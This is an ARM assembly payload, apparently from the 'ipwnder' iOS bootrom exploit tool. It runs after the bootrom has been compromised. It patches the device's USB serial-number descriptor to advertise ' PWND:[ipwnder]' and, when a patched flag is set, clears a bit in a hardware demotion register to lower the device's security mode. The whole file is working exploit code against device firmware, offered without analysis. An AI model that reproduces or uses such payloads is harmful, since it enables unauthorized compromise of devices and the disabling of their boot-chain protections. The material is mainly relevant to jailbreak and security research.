.text

.pool
.set gUSBSerialNumber,             0x10061F80
.set gUSBSRNMStringDescriptor,     0x100600D8
.set usb_create_string_descriptor, 0x00007C55

.set demotion_flag,                0x41414141
.set gDemotionRegister,            0x3f500000

.code 32
.global _main
_main:
    push {r4-r7,lr}

    ldr  r0, =gUSBSerialNumber
_find_zero_loop:
    add  r0, r0, #1
    ldrb r1, [r0]
    cmp  r1, #0
    bne  _find_zero_loop

    adr  r1, PWND_STRING
    ldr  r2, [r1]
    ldr  r3, [r1, #0x4]
    str  r2, [r0]
    str  r3, [r0, #0x4]
    ldr  r2, [r1, #0x8]
    ldr  r3, [r1, #0xc]
    str  r2, [r0, #0x8]
    str  r3, [r0, #0xc]

    ldr  r0, =gUSBSerialNumber
    ldr  r1, =usb_create_string_descriptor
    ldr  r4, =gUSBSRNMStringDescriptor
    blx  r1
    strb r0, [r4]

    ldr  r0, =demotion_flag
    cmp  r0, #1
    bne  _end

_demotion:
    ldr  r1, =gDemotionRegister
    ldr  r0, [r1]
    tst  r0, #1
    beq  _end

    ldr  r0, [r1]
    and  r0, r0, #0xfffffffe
    str  r0, [r1]
    mcr  p15, 0, r0, c7, c14, #1
    dmb  sy
    b    _end

_end:
    mov  r0, #0
    mcr  p15, 0, r0, c7, c5, #0
    dsb
    isb

    pop  {r4-r7,pc}

PWND_STRING:
.asciz " PWND:[ipwnder]"
